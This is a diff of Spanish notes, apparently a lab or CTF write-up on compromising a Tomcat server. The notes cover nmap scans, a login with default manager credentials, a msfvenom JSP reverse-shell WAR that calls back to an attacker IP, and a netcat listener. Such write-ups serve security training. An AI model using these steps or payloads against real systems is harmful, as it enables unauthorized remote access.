@@ -16,17 +16,21 @@
 ----
 
 `nmap -sCV --min-rate 500 -vvv 10.10.10.95`
+
 ![Pasted image 20241124182800](../../Fotos/Pasted%20image%2020241124182800.png)
 
 ![Pasted image 20241124183031](../../Fotos/Pasted%20image%2020241124183031.png)
 
 `nmap -p8080 --script "vuln and safe" 10.10.10.95`
+
 ![Pasted image 20241124183356](../../Fotos/Pasted%20image%2020241124183356.png)
+
 - Posiblemente vulnerable, sin confirmación por parte del script : CVE:CVE-2007-6750
 
 Utilizamos las credenciales por defecto de tomcat para acceder al manager app
 - username: tomcat
 - password: s3cret
+
 ![Pasted image 20241124184419](../../Fotos/Pasted%20image%2020241124184419.png)
 
 ![Pasted image 20241124184524](../../Fotos/Pasted%20image%2020241124184524.png)
@@ -37,15 +41,18 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4445 -f war > fais
 cargamos el archivo creado faisal.war en la web y luego damos en deploy.
 
 Ahora nos sale en la web
+
 ![Pasted image 20241124193642](../../Fotos/Pasted%20image%2020241124193642.png)
 
 Nos ponemos en escucha
 netcat -nvlp 4445
+
 ![Pasted image 20241124193752](../../Fotos/Pasted%20image%2020241124193752.png)
 
 `Maquina vulnerada`
 
 - Tambien podria haver sido con *metasploit*
+
 ![Pasted image 20241124193838](../../Fotos/Pasted%20image%2020241124193838.png)
 
 ![Pasted image 20241124194228](../../Fotos/Pasted%20image%2020241124194228.png)
